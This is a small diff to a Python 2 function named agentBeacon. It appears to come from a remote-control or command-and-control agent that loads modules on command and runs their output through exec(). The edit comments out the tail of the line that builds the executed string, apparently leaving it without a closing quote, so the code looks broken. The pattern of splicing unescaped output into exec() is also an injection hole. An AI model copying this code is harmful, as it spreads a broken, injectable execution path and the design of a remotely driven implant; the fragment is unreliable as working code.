@@ -114,7 +114,7 @@ def agentBeacon():
 				f, filename, description = imp.find_module("modules/"+module)
 				m=imp.load_module(module,f,filename,description)
 				
-				cmd="DATA[\"cmdreturn\"]=\""+m.run(c[c.keys()[2]]).replace("\n",' ')+"\""
+				cmd="DATA[\"cmdreturn\"]=\""+m.run(c[c.keys()[2]])#.replace("\n",' ')+"\""
 				print cmd
 				DATA["DATE"]=c[c.keys()[1]]
 				exec(cmd)
